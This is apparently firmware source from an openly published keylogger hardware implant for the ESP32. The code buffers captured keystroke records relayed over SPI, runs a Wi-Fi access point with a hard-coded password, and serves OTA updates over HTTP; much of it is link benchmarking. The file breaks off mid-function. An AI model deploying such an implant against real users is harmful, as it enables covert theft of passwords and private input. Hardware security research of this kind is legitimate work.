/*
MIT License - okhi - Open Keylogger Hardware Implant
---------------------------------------------------------------------------
Copyright (c) [2024] by David Reguera Garcia aka Dreg
https://github.com/therealdreg/okhi
https://www.rootkit.es
X @therealdreg
dreg@rootkit.es
---------------------------------------------------------------------------
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
---------------------------------------------------------------------------
*/

#ifndef __COM_ESP_H__
#define __COM_ESP_H__

#include <errno.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/param.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <unistd.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_app_desc.h"
#include "esp_chip_info.h"
#include "esp_flash.h"
#include "esp_attr.h"
#include "esp_event.h"
#include "esp_heap_caps.h"
#include "esp_ota_ops.h"
#include "esp_partition.h"
#include "esp_log.h"
#include "esp_mac.h"
#include "esp_netif.h"
#include "esp_spiffs.h"
#include "esp_system.h"
#include "esp_timer.h"
#include "esp_wifi.h"

#include "nvs_flash.h"

#include "lwip/inet.h"
#include "lwip/sockets.h"

#include "driver/gpio.h"
#include "driver/spi_slave.h"
#include "driver/uart.h"

#include "com.h"

#define HTTP_PORT 80
#define HTTP_LISTEN_BACKLOG 8
#define HTTP_MAX_CONN 4
#define HTTP_REQ_MAX 1280
#define HTTP_BODY_MAX 1536
#define HTTP_RESP_MAX 2048
#define HTTP_HEADER_MAX 320
#define HTTP_RECV_TIMEOUT_MS 1200
#define HTTP_SEND_TIMEOUT_MS 5000
#define HTTP_SELECT_TIMEOUT_MS 200
#define HTTP_PATH_MAX 128

#define HTTP_TEXT_PLAIN "text/plain; charset=UTF-8"
#define HTTP_TEXT_HTML "text/html; charset=UTF-8"

#define ESP_WIFI_PASS "1234567890"

#define WIFI_CFG_NS "okhicfg"
#define WIFI_SSID_MAX 32
#define WIFI_PASS_MAX 64
#define WIFI_STA_GIVE_UP_MS 25000
#define WIFI_STA_MAX_FAILS 2
#define ESP_WIFI_CHANNEL CONFIG_ESP_WIFI_CHANNEL
#define MAX_STA_CONN 6

#define GTK_REKEY_INTERVAL CONFIG_ESP_GTK_REKEY_INTERVAL

#define GPIO_MOSI 7
#define GPIO_MISO 2
#define GPIO_SCLK 6
#define GPIO_CS 10

#define RCV_HOST SPI2_HOST

#define EBOOT_MASTERDATAREADY_GPIO 9
#define ELOG_SLAVEREADY_GPIO 8

#define SPI_QUEUE_DEPTH 8

#define SPI_TX_DIAGNOSTIC_FILL 0
#define SPI_BENCH_ARM_FRAMES 64

#define BENCH_IDLE SPI_BENCH_STATE_IDLE
#define BENCH_ARMED SPI_BENCH_STATE_ARMED
#define BENCH_RUNNING SPI_BENCH_STATE_RUNNING
#define BENCH_DONE SPI_BENCH_STATE_DONE
#define BENCH_TIMEOUT SPI_BENCH_STATE_TIMEOUT
#define BENCH_ABORTED SPI_BENCH_STATE_ABORTED

#define BENCH_ARM_TIMEOUT_MS 6000
#define BENCH_STALL_MS 8000
#define BENCH_STEP_OVERHEAD_MS 500
#define BENCH_SOAK_MARGIN_MS 15000
#define BENCH_UART_STEP_CAP_MS 30000

#define RP_IMAGE_PATH "/spiffs/rp.bin"
#define RP_IMAGE_TMP_PATH "/spiffs/rp.new"
#define RP_IMAGE_MAX_SIZE (512 * 1024)
#define RP_WINDOW_SIZE 4096

#define OTA_VALIDATE_TIMEOUT_MS 300000
#define OTA_REBOOT_DELAY_MS 500
#define OTA_MIN_IMAGE_SIZE 8192

#define OTA_PKG_HEADER_SIZE 32
#define OTA_PKG_FORMAT_VERSION 1
#define OTA_NVS_NAMESPACE "okhi"

#define RECORD_PAYLOAD_MAX 62
#define RING_ENTRIES 512
#define RING_MASK (RING_ENTRIES - 1)
#define RING_READABLE (RING_ENTRIES - 8)

#define RP_STATUS_MAX 128
#define HWVER_MAX 64
#define RP_LINK_STALE_MS 3000

#define UART_PORT UART_NUM_0
#define UART_TX_PIN GPIO_NUM_20
#define UART_RX_PIN GPIO_NUM_19
#define UART_RXBUF_SZ 2048
#define UART_CHUNK_SIZE 64
#define UART_BENCH_TX_BUF 512
#define UART_BENCH_QUIET_MS 10

#define LED_GPIO 0

typedef struct
{
    uint16_t len;
    uint8_t data[RECORD_PAYLOAD_MAX];
} hid_record_t;

typedef struct
{
    uint32_t actual_hz;
    uint32_t target_hz;
    uint32_t frames;
    uint32_t miso_ok;
    uint32_t miso_bad;
    uint32_t xfer_fail;
    uint32_t elapsed_ms;
    uint32_t stale;
    uint32_t mosi_ok;
    uint32_t mosi_bad;
    uint32_t peri_hz;
    uint32_t peer_tx;
    uint16_t offset_min;
    uint16_t offset_max;
    uint8_t phase;
    uint8_t kind;
    uint8_t fbdiv;
    uint8_t pd1;
    uint8_t pd2;
    uint8_t auxsrc;
    bool valid;
    bool soaked;
} bench_step_t;

typedef struct
{
    uint32_t spi_transactions;
    uint32_t spi_records;
    uint32_t spi_empty;
    uint32_t spi_truncated;
    uint32_t spi_errors;
    uint32_t spi_queue_errors;
    uint32_t spi_polls;
    uint32_t spi_proto_mismatch;
    uint32_t ring_dropped;
    uint32_t http_requests;
    uint32_t http_rejected;
} okhi_stats_t;

typedef enum
{
    HTTP_CONN_FREE = 0,
    HTTP_CONN_RECV,
    HTTP_CONN_BODY,
    HTTP_CONN_SEND
} http_conn_state_t;

typedef enum
{
    HTTP_BODY_NONE = 0,
    HTTP_BODY_OTA,
    HTTP_BODY_RPIMAGE
} http_body_sink_t;

typedef struct
{
    int fd;
    const uint8_t *send_ptr;
    size_t send_left;
    http_conn_state_t state;
    http_body_sink_t body_sink;
    int64_t deadline_ms;
    size_t req_len;
    size_t body_expected;
    size_t body_received;
    size_t resp_len;
    size_t resp_sent;
    char req[HTTP_REQ_MAX];
    char resp[HTTP_RESP_MAX];
} http_conn_t;

static hid_record_t hid_ring[RING_ENTRIES];
static volatile uint32_t hid_ring_write;

static okhi_stats_t stats;

static char rp_status[2][RP_STATUS_MAX];
static volatile uint8_t rp_status_index;

static char hw_version[HWVER_MAX];
static bool hw_version_known;

static char rp_identity[SPI_IDENTITY_MAX];
static uint8_t rp_frame_version;
static volatile uint32_t rp_last_seen_ms;

static http_conn_t http_conns[HTTP_MAX_CONN];
static char http_body[HTTP_BODY_MAX];
static uint32_t http_legacy_cursor;

static esp_ota_handle_t ota_handle;
static const esp_partition_t *ota_partition;
static bool ota_active;
static bool ota_reboot_pending;

static bool app_awaiting_validation;
static bool app_booted_pending;
static int64_t app_validation_deadline_ms;

typedef enum
{
    OTA_STAGE_HEADER = 0,
    OTA_STAGE_ESP,
    OTA_STAGE_RP,
    OTA_STAGE_DONE
} ota_stage_t;

static ota_stage_t ota_stage;
static uint8_t ota_header[OTA_PKG_HEADER_SIZE];
static size_t ota_header_got;
static bool ota_is_package;
static uint32_t ota_esp_len;
static uint32_t ota_esp_crc;
static uint32_t ota_esp_got;
static uint32_t ota_esp_running;
static uint32_t ota_rp_len;
static uint32_t ota_rp_crc;
static uint32_t ota_rp_got;
static uint32_t ota_rp_running;
static bool ota_esp_validated;
static bool ota_rp_validated;
static bool rp_commit_pending;
static volatile bool rp_commit_completed;
static volatile bool rp_image_in_use;

// The web reset button asks the RP (the SPI master and the only chip that can
// pull the ESP's CHIP_PU) to reboot, which reboots this ESP too. reset_times is
// a boot counter in NVS: it survives a reboot but not a firmware change, so a
// rising count is proof the board actually restarted after the button.
static volatile bool esp_rp_reset_pending;
static uint32_t esp_reset_times;
static http_conn_t *upload_owner;
static char ota_last_error[96];
static uint32_t ota_uploads_ok;
static uint32_t ota_uploads_failed;

static WORD_ALIGNED_ATTR uint8_t spi_rx_buffers[SPI_QUEUE_DEPTH][SPI_FRAME_SIZE];
static WORD_ALIGNED_ATTR uint8_t spi_tx_buffers[SPI_QUEUE_DEPTH][SPI_FRAME_SIZE];
static spi_slave_transaction_t spi_transactions[SPI_QUEUE_DEPTH];

static const uint8_t spi_frame_magic[4] = {SPI_FRAME_MAGIC_BYTES};
static const uint8_t spi_ctrl_magic[4] = {SPI_CTRL_MAGIC_BYTES};

static uint32_t spi_bench_ms;
static uint16_t spi_bench_min_khz;
static uint16_t spi_bench_max_khz;
static uint32_t spi_bench_min_baud;
static uint32_t spi_bench_max_baud;
static uint8_t spi_bench_max_steps;
static uint8_t spi_bench_run_id;
static volatile uint8_t spi_bench_state;
static volatile uint8_t spi_bench_total_steps;
static volatile uint8_t spi_bench_done_steps;
static volatile uint8_t spi_bench_ack_step = 0xFE;
static volatile uint8_t spi_bench_result_ack;
static volatile uint8_t spi_bench_cur_step;
static volatile uint32_t spi_bench_native_peri_hz;
static volatile int64_t spi_bench_deadline_ms;
static volatile int64_t spi_bench_arm_deadline_ms;
static volatile int64_t spi_bench_last_frame_ms;
static uint32_t spi_bench_seq;
static uint32_t spi_bench_epoch;
static uint32_t spi_bench_tx_epoch[SPI_QUEUE_DEPTH];
static uint32_t spi_bench_tx_state[SPI_QUEUE_DEPTH];
static uint32_t spi_bench_last_mosi_seq;

static volatile uint32_t spi_bench_bad_magic;
static volatile uint32_t spi_bench_bad_len;
static volatile uint32_t spi_bench_bad_crc;
static volatile uint32_t spi_bench_bad_seq;
static volatile uint32_t spi_bench_last_bad_len;
static uint8_t spi_bench_bad_head[12];
static uint32_t spi_bench_soak_ms;

// Non-zero while a re-armed run is resuming after a reset: the kHz the RP should
// drop below and confirm downward from, skipping the sweep. Persisted so it
// survives the brownout that a marginal soak can cause. See SPI_BENCH_STATUS_RESUME_OFF.
static uint16_t rbench_resume_khz;

static void rbench_save_probing(uint32_t khz);
static void rbench_clear(void);

typedef struct
{
    uint32_t a;
    uint32_t b;
    uint8_t id;
    uint8_t status;
    char text[SPI_SELFTEST_TEXT_MAX + 1];
} selftest_row_t;

#define ST_IDLE 0
#define ST_RUNNING 1
#define ST_DONE 2
#define ST_TIMEOUT 3
#define ST_ABORTED 4

#define ST_RP_TIMEOUT_MS 30000
#define ST_BLINK_MS 3000

static selftest_row_t st_rows[SPI_SELFTEST_MAX_RESULTS];
static volatile uint8_t st_count;
static volatile uint8_t st_state;
static uint8_t st_run_id;
static uint8_t st_opts;
static volatile uint8_t st_blink;
static volatile int64_t st_deadline_ms;
static uint8_t spi_bench_stepdowns;
static uint8_t spi_bench_kind;

static volatile uint32_t uart_bench_want_baud;
static volatile uint32_t uart_bench_seed;
static volatile uint8_t uart_bench_token;
static volatile uint8_t uart_bench_acked;
static volatile bool uart_bench_ready;
static volatile bool uart_bench_send;
static volatile uint32_t uart_bench_rx_ok;
static volatile uint32_t uart_bench_rx_bad;
static volatile uint32_t uart_bench_resync;
static volatile uint32_t uart_bench_tx;
static volatile uint32_t uart_bench_baud;
static uint8_t spi_bench_overclock;
static volatile uint32_t spi_bench_sys_hz;
static volatile uint8_t spi_bench_soak_step = SPI_BENCH_NO_STEP;
static bench_step_t spi_bench_steps[SPI_BENCH_MAX_STEPS];

static volatile uint32_t rp_image_size;
static volatile uint32_t rp_image_crc;
static volatile bool rp_image_ready;
static volatile int rp_image_fd = -1;
static uint8_t rp_window[RP_WINDOW_SIZE];
static uint32_t rp_window_offset = SPI_NO_BLOCK;
static volatile uint32_t spi_requested_block = SPI_NO_BLOCK;
static volatile uint32_t rp_commit_frames_left;
static uint32_t spi_blocks_served;

static uint32_t spi_last_empty_bits;
static uint8_t spi_last_empty_head[8];
static uint32_t spi_last_record_bits;

static char wifi_ssid[WIFI_SSID_MAX];
static char wifi_pass[WIFI_PASS_MAX];
static char wifi_ap_ssid[WIFI_SSID_MAX];
static int64_t wifi_reboot_at_ms;
static bool wifi_want_sta;
static bool wifi_forced_ap;
static volatile uint32_t wifi_ip;
static volatile uint8_t wifi_link;
static int64_t wifi_sta_deadline_ms;
static esp_netif_t *wifi_netif;

static const char *TAG = "okhi";
static const char *HTTP_TAG = "http";
static const char *SPI_TAG = "spi";
static const char *UART_TAG = "uart";
static const char *SPIFFS_TAG = "spiffs";
static const char *WIFI_TAG = "wifi";

static void blink_led_n(int n)
{
    gpio_config_t io = {.pin_bit_mask = 1ULL << LED_GPIO,
                        .mode = GPIO_MODE_OUTPUT,
                        .pull_up_en = GPIO_PULLUP_DISABLE,
                        .pull_down_en = GPIO_PULLDOWN_DISABLE,
                        .intr_type = GPIO_INTR_DISABLE};

    gpio_config(&io);
    vTaskDelay(pdMS_TO_TICKS(500));

    for (int i = 0; i < n; ++i)
    {
        gpio_set_level(LED_GPIO, 1);
        vTaskDelay(pdMS_TO_TICKS(500));
        gpio_set_level(LED_GPIO, 0);
        vTaskDelay(pdMS_TO_TICKS(500));
    }
}

static void wifi_service(void);

static void led_task(void *arg)
{
    (void)arg;

    blink_led_n(3);

    while (1)
    {
        vTaskDelay(pdMS_TO_TICKS(500));
        wifi_service();
    }
}

static void spiffs_init(void)
{
    esp_vfs_spiffs_conf_t conf = {
        .base_path = "/spiffs", .partition_label = "storage", .max_files = 12, .format_if_mount_failed = true};

    esp_err_t ret = esp_vfs_spiffs_register(&conf);
    if (ret != ESP_OK)
    {
        ESP_LOGE(SPIFFS_TAG, "error mounting SPIFFS (%s)", esp_err_to_name(ret));
        return;
    }

    size_t total = 0;
    size_t used = 0;
    if (esp_spiffs_info(conf.partition_label, &total, &used) == ESP_OK)
    {
        ESP_LOGI(SPIFFS_TAG, "SPIFFS total=%u used=%u", (unsigned)total, (unsigned)used);
    }
}

static uint32_t hid_ring_head(void)
{
    return __atomic_load_n(&hid_ring_write, __ATOMIC_ACQUIRE);
}

static void hid_ring_publish(const uint8_t *src, size_t len)
{
    if (len > RECORD_PAYLOAD_MAX)
    {
        len = RECORD_PAYLOAD_MAX;
        stats.spi_truncated++;
    }

    uint32_t index = hid_ring_write;
    hid_record_t *slot = &hid_ring[index & RING_MASK];

    slot->len = (uint16_t)len;
    memcpy(slot->data, src, len);

    __atomic_store_n(&hid_ring_write, index + 1, __ATOMIC_RELEASE);
}

static bool hid_ring_read(uint32_t index, hid_record_t *out)
{
    const hid_record_t *slot = &hid_ring[index & RING_MASK];

    uint16_t len = slot->len;
    if (len > RECORD_PAYLOAD_MAX)
    {
        len = RECORD_PAYLOAD_MAX;
    }

    memcpy(out->data, slot->data, len);
    out->len = len;

    return (hid_ring_head() - index) <= RING_ENTRIES;
}

static uint32_t hid_ring_clamp(uint32_t cursor, uint32_t head, uint32_t *skipped)
{
    *skipped = 0;

    if ((int32_t)(cursor - head) > 0)
    {
        return head;
    }

    uint32_t pending = head - cursor;
    if (pending > RING_READABLE)
    {
        *skipped = pending - RING_READABLE;
        return head - RING_READABLE;
    }

    return cursor;
}

static void IRAM_ATTR spi_post_setup_cb(spi_slave_transaction_t *trans)
{
    (void)trans;
    gpio_set_level(ELOG_SLAVEREADY_GPIO, 1);
}

static void IRAM_ATTR spi_post_trans_cb(spi_slave_transaction_t *trans)
{
    (void)trans;
    gpio_set_level(ELOG_SLAVEREADY_GPIO, 0);
}

static uint32_t crc32_update(uint32_t crc, const uint8_t *data, size_t len)
{
    static const uint32_t table[16] = {0x00000000, 0x1db71064, 0x3b6e20c8, 0x26d930ac, 0x76dc4190, 0x6b6b51f4,
                                       0x4db26158, 0x5005713c, 0xedb88320, 0xf00f9344, 0xd6d6a3e8, 0xcb61b38c,
                                       0x9b64c2b0, 0x86d3d2d4, 0xa00ae278, 0xbdbdf21c};

    for (size_t i = 0; i < len; ++i)
    {
        crc ^= data[i];
        crc = (crc >> 4) ^ table[crc & 0x0f];
        crc = (crc >> 4) ^ table[crc & 0x0f];
    }

    return crc;
}

static uint32_t crc32_buffer(const uint8_t *data, size_t len)
{
    return crc32_update(0xffffffffu, data, len) ^ 0xffffffffu;
}

static void spi_put_u32(uint8_t *dst, uint32_t value)
{
    dst[0] = (uint8_t)value;
    dst[1] = (uint8_t)(value >> 8);
    dst[2] = (uint8_t)(value >> 16);
    dst[3] = (uint8_t)(value >> 24);
}

static uint32_t spi_get_u32(const uint8_t *src)
{
    return (uint32_t)src[0] | ((uint32_t)src[1] << 8) | ((uint32_t)src[2] << 16) | ((uint32_t)src[3] << 24);
}

static bool spi_is_control_frame(const uint8_t *data)
{
    return memcmp(data, spi_ctrl_magic, sizeof(spi_ctrl_magic)) == 0;
}

// A transaction the slave completes with no clocks leaves the buffer as the
// zeroes it was re-queued with, so an all 0x00 (or all 0xff) frame is a spurious
// empty transaction, not a corrupted one. The bench must not count it as a lost
// MOSI frame or the strict soak can never pass.
static bool spi_frame_is_silent(const uint8_t *data)
{
    for (size_t i = 0; i < SPI_FRAME_SIZE; ++i)
    {
        if (data[i] != 0x00 && data[i] != 0xff)
        {
            return false;
        }
    }

    return true;
}

static int64_t bench_now_ms(void)
{
    return esp_timer_get_time() / 1000;
}

static void bench_service(void)
{
    if (spi_bench_state != BENCH_ARMED && spi_bench_state != BENCH_RUNNING)
    {
        return;
    }

    int64_t now = bench_now_ms();

    if (spi_bench_state == BENCH_ARMED && now > spi_bench_arm_deadline_ms)
    {
        spi_bench_state = BENCH_TIMEOUT;
        return;
    }

    if (now > spi_bench_deadline_ms)
    {
        spi_bench_state = BENCH_TIMEOUT;
        rbench_clear();
        return;
    }

    if (spi_bench_state == BENCH_RUNNING && now - spi_bench_last_frame_ms > BENCH_STALL_MS)
    {
        spi_bench_state = BENCH_TIMEOUT;
        rbench_clear();
    }
}

static void st_service(void)
{
    if (st_state == ST_RUNNING && bench_now_ms() > st_deadline_ms)
    {
        st_state = ST_TIMEOUT;
        st_blink = 0;
    }
}

static const char *busy_reason(void)
{
    if (ota_reboot_pending || upload_owner != NULL || rp_image_ready)
    {
        return "a firmware update is in progress";
    }

    if (spi_bench_state == BENCH_ARMED || spi_bench_state == BENCH_RUNNING)
    {
        return "a link benchmark is running";
    }

    if (st_state == ST_RUNNING)
    {
        return "a hardware self test is running";
    }

    return NULL;
}

static void bench_saw_rp_frame(void)
{
    int64_t now = bench_now_ms();

    rp_last_seen_ms = (uint32_t)now;
    spi_bench_last_frame_ms = now;

    if (spi_bench_state == BENCH_ARMED)
    {
        spi_bench_state = BENCH_RUNNING;
    }
}

static void bench_account_mosi(const uint8_t *frame, size_t trans_bits)
{
    if (frame[4] != SPI_FRAME_VERSION)
    {
        return;
    }

    bench_saw_rp_frame();

    if (spi_bench_state != BENCH_RUNNING)
    {
        return;
    }

    uint8_t step = frame[SPI_BENCH_MOSI_STEP_OFF];

    if (step >= SPI_BENCH_MAX_STEPS)
    {
        return;
    }

    spi_bench_cur_step = step;

    uint32_t seq = spi_get_u32(frame + SPI_BENCH_MOSI_SEQ_OFF);

    // The slave's trans_len is not reliable on this platform in full duplex: it
    // reports fewer bits than SPI_FRAME_SIZE * 8 (and sometimes zero) even when
    // all 256 bytes arrive, which the CRC below confirms. Integrity is decided by
    // the CRC and the sequence number, exactly the way the RP validates MISO with
    // spi_find_frame instead of trusting a length. The length mismatch is only
    // counted, never fatal.
    if (trans_bits != SPI_FRAME_SIZE * 8)
    {
        spi_bench_bad_len++;
        spi_bench_last_bad_len = (uint32_t)trans_bits;
    }

    bool good = true;

    uint32_t want = crc32_update(0xffffffffu, frame + SPI_BENCH_MOSI_CRC_A_OFF, SPI_BENCH_MOSI_CRC_A_LEN);

    want = crc32_update(want, frame + SPI_BENCH_MOSI_CRC_B_OFF, SPI_BENCH_MOSI_CRC_B_LEN) ^ 0xffffffffu;

    if (good && want != spi_get_u32(frame + SPI_BENCH_MOSI_CRC_OFF))
    {
        good = false;
        spi_bench_bad_crc++;

        memcpy(spi_bench_bad_head, frame, sizeof(spi_bench_bad_head));
    }

    if (good && seq <= spi_bench_last_mosi_seq)
    {
        good = false;
        spi_bench_bad_seq++;
    }

    if (seq > spi_bench_last_mosi_seq)
    {
        spi_bench_last_mosi_seq = seq;
    }

    if (good)
    {
        spi_bench_steps[step].mosi_ok++;
    }
    else
    {
        spi_bench_steps[step].mosi_bad++;
    }
}

static void bench_account_garbage_frame(const uint8_t *frame, size_t trans_bits)
{
    spi_bench_bad_magic++;
    spi_bench_last_bad_len = (uint32_t)trans_bits;

    memcpy(spi_bench_bad_head, frame, sizeof(spi_bench_bad_head));
}

static void bench_account_garbage(void)
{
    uint8_t step = spi_bench_cur_step;

    if (step < SPI_BENCH_MAX_STEPS)
    {
        spi_bench_steps[step].mosi_bad++;
    }

    spi_bench_last_frame_ms = bench_now_ms();
}

static void st_add(uint8_t id, uint8_t status, uint32_t a, uint32_t b, const char *text)
{
    uint8_t count = st_count;
    selftest_row_t *row = NULL;

    for (uint8_t i = 0; i < count && i < SPI_SELFTEST_MAX_RESULTS; ++i)
    {
        if (st_rows[i].id == id)
        {
            row = &st_rows[i];
            break;
        }
    }

    if (row == NULL)
    {
        if (count >= SPI_SELFTEST_MAX_RESULTS)
        {
            return;
        }

        row = &st_rows[count];
    }

    row->id = id;
    row->status = status;
    row->a = a;
    row->b = b;

    size_t used = 0;

    if (text != NULL)
    {
        while (text[used] != '\0' && used < SPI_SELFTEST_TEXT_MAX)
        {
            char c = text[used];

            row->text[used] = (c >= 0x20 && c <= 0x7E && c != ',') ? c : ' ';
            used++;
        }
    }

    row->text[used] = '\0';

    if (row == &st_rows[count])
    {
        __atomic_store_n(&st_count, (uint8_t)(count + 1), __ATOMIC_RELEASE);
    }
}

static void bench_accept_selftest(const uint8_t *frame)
{
    if (frame[4] != SPI_FRAME_VERSION || frame[SPI_BENCH_MOSI_RUN_OFF] != st_run_id)
    {
        return;
    }

    if (crc32_buffer(frame + SPI_BENCH_RESULT_CRC_FROM, SPI_BENCH_RESULT_CRC_LEN) !=
        spi_get_u32(frame + SPI_BENCH_RESULT_CRC_OFF))
    {
        return;
    }

    rp_last_seen_ms = (uint32_t)bench_now_ms();
    spi_bench_result_ack = frame[SPI_BENCH_RESULT_SEQ_OFF];

    if (st_state != ST_RUNNING)
    {
        return;
    }

    st_deadline_ms = bench_now_ms() + ST_RP_TIMEOUT_MS;

    uint8_t id = frame[SPI_SELFTEST_ID_OFF];
    uint8_t flags = frame[SPI_SELFTEST_FLAGS_OFF];

    if (id != 0)
    {
        char text[SPI_SELFTEST_TEXT_MAX + 1];

        memcpy(text, frame + SPI_SELFTEST_TEXT_OFF, SPI_SELFTEST_TEXT_MAX);
        text[SPI_SELFTEST_TEXT_MAX] = '\0';

        st_add(id, frame[SPI_SELFTEST_STATUS_OFF], spi_get_u32(frame + SPI_SELFTEST_A_OFF),
               spi_get_u32(frame + SPI_SELFTEST_B_OFF), text);
    }

    if ((flags & SPI_SELFTEST_FLAG_LAST) != 0)
    {
        st_state = (flags & SPI_SELFTEST_FLAG_ABORTED) != 0 ? ST_ABORTED : ST_DONE;
        st_blink = 0;

        ESP_LOGI(SPI_TAG, "self test run %u finished with %u findings", (unsigned)st_run_id, (unsigned)st_count);
    }
}

static void bench_accept_uart_setup(const uint8_t *frame)
{
    if (frame[4] != SPI_FRAME_VERSION || frame[SPI_BENCH_MOSI_RUN_OFF] != spi_bench_run_id)
    {
        return;
    }

    if (crc32_buffer(frame + SPI_BENCH_RESULT_CRC_FROM, SPI_BENCH_RESULT_CRC_LEN) !=
        spi_get_u32(frame + SPI_BENCH_RESULT_CRC_OFF))
    {
        return;
    }

    bench_saw_rp_frame();

    if (spi_bench_state != BENCH_RUNNING)
    {
        return;
    }

    uint32_t baud = spi_get_u32(frame + SPI_UART_SETUP_BAUD_OFF);

    if (baud != 0 && (baud < UART_BENCH_MIN_BAUD || baud > UART_BENCH_MAX_BAUD))
    {
        return;
    }

    uart_bench_seed = spi_get_u32(frame + SPI_UART_SETUP_SEED_OFF);
    uart_bench_send = frame[SPI_UART_SETUP_FLAGS_OFF] != 0;
    uart_bench_token = frame[SPI_UART_SETUP_TOKEN_OFF];
    uart_bench_want_baud = baud;

    // A baud of 0 is a probe, not a step: the RP uses it to confirm the link is
    // up before the first step and to tell us to stop between steps. uart_bench_run()
    // only runs for a real baud (uart_rx_task gates on want_baud != 0), so nothing
    // would ever echo the probe's token back and the RP's setup handshake would
    // time out, aborting the whole UART benchmark before a single step. Ack it here.
    if (baud == 0)
    {
        uart_bench_acked = uart_bench_token;
        uart_bench_ready = false;
    }
}

static void bench_accept_result(const uint8_t *frame)
{
    if (frame[4] != SPI_FRAME_VERSION || frame[SPI_BENCH_MOSI_RUN_OFF] != spi_bench_run_id)
    {
        return;
    }

    if (crc32_buffer(frame + SPI_BENCH_RESULT_CRC_FROM, SPI_BENCH_RESULT_CRC_LEN) !=
        spi_get_u32(frame + SPI_BENCH_RESULT_CRC_OFF))
    {
        return;
    }

    bench_saw_rp_frame();

    spi_bench_result_ack = frame[SPI_BENCH_RESULT_SEQ_OFF];

    if (spi_bench_state != BENCH_RUNNING)
    {
        return;
    }

    uint8_t flags = frame[SPI_BENCH_RESULT_FLAGS_OFF];
    uint8_t total = frame[SPI_BENCH_RESULT_TOTAL_OFF];
    uint8_t step = frame[SPI_BENCH_MOSI_STEP_OFF];

    spi_bench_total_steps = total > SPI_BENCH_MAX_STEPS ? SPI_BENCH_MAX_STEPS : total;
    spi_bench_native_peri_hz = spi_get_u32(frame + SPI_BENCH_RESULT_NATIVE_OFF);
    spi_bench_sys_hz = spi_get_u32(frame + SPI_BENCH_RESULT_SYSCLK_OFF);

    if ((flags & SPI_BENCH_RESULT_FLAG_SOAK_BEGIN) != 0 && step < SPI_BENCH_MAX_STEPS)
    {
        bench_step_t *slot = &spi_bench_steps[step];

        slot->mosi_ok = 0;
        slot->mosi_bad = 0;
        slot->soaked = true;

        spi_bench_soak_step = step;
        spi_bench_cur_step = step;

        // Record the clock about to be hammered, before it can brown the board
        // out, so a reset that never returns still leaves a breadcrumb.
        rbench_save_probing(spi_get_u32(frame + SPI_BENCH_RESULT_TARGET_OFF) / 1000u);

        ESP_LOGI(SPI_TAG, "bench run %u: confirming step %u for %u ms", (unsigned)spi_bench_run_id, (unsigned)step,
                 (unsigned)spi_bench_soak_ms);
    }

    if (step < SPI_BENCH_MAX_STEPS)
    {
        bench_step_t *slot = &spi_bench_steps[step];

        slot->actual_hz = spi_get_u32(frame + SPI_BENCH_RESULT_ACTUAL_OFF);
        slot->target_hz = spi_get_u32(frame + SPI_BENCH_RESULT_TARGET_OFF);
        slot->frames = spi_get_u32(frame + SPI_BENCH_RESULT_FRAMES_OFF);
        slot->miso_ok = spi_get_u32(frame + SPI_BENCH_RESULT_MISO_OK_OFF);
        slot->miso_bad = spi_get_u32(frame + SPI_BENCH_RESULT_MISO_BAD_OFF);
        slot->xfer_fail = spi_get_u32(frame + SPI_BENCH_RESULT_XFER_FAIL_OFF);
        slot->elapsed_ms = spi_get_u32(frame + SPI_BENCH_RESULT_ELAPSED_MS_OFF);
        slot->stale = spi_get_u32(frame + SPI_BENCH_RESULT_STALE_OFF);
        slot->peri_hz = spi_get_u32(frame + SPI_BENCH_RESULT_CLKPERI_OFF);
        slot->phase = frame[SPI_BENCH_RESULT_PHASE_OFF];
        slot->kind = frame[SPI_BENCH_RESULT_KIND_OFF];
        slot->peer_tx = spi_get_u32(frame + SPI_BENCH_RESULT_PEER_TX_OFF);

        if (slot->kind == SPI_BENCH_KIND_UART)
        {
            slot->mosi_ok = spi_get_u32(frame + SPI_BENCH_RESULT_MOSI_OK_OFF);
            slot->mosi_bad = spi_get_u32(frame + SPI_BENCH_RESULT_MOSI_BAD_OFF);
        }
        slot->fbdiv = frame[SPI_BENCH_RESULT_FBDIV_OFF];
        slot->pd1 = frame[SPI_BENCH_RESULT_PD1_OFF];
        slot->pd2 = frame[SPI_BENCH_RESULT_PD2_OFF];
        slot->auxsrc = frame[SPI_BENCH_RESULT_AUXSRC_OFF];
        slot->offset_min = (uint16_t)frame[SPI_BENCH_RESULT_OFFMIN_OFF] |
                           (uint16_t)(frame[SPI_BENCH_RESULT_OFFMIN_OFF + 1] << 8);
        slot->offset_max = (uint16_t)frame[SPI_BENCH_RESULT_OFFMAX_OFF] |
                           (uint16_t)(frame[SPI_BENCH_RESULT_OFFMAX_OFF + 1] << 8);

        if (!slot->valid)
        {
            slot->valid = true;
            spi_bench_done_steps++;
        }

        if ((flags & (SPI_BENCH_RESULT_FLAG_PROGRESS | SPI_BENCH_RESULT_FLAG_SOAK_BEGIN)) == 0)
        {
            spi_bench_cur_step = (uint8_t)(step + 1);
        }
    }

    spi_bench_ack_step = step;

    if ((flags & SPI_BENCH_RESULT_FLAG_LAST) != 0)
    {
        spi_bench_state = (flags & SPI_BENCH_RESULT_FLAG_ABORTED) != 0 ? BENCH_ABORTED : BENCH_DONE;
        rbench_clear();
        ESP_LOGI(SPI_TAG, "bench run %u finished, %u steps", (unsigned)spi_bench_run_id,
                 (unsigned)spi_bench_done_steps);
    }
}

static uint32_t bench_miso_sent(const bench_step_t *slot)
{
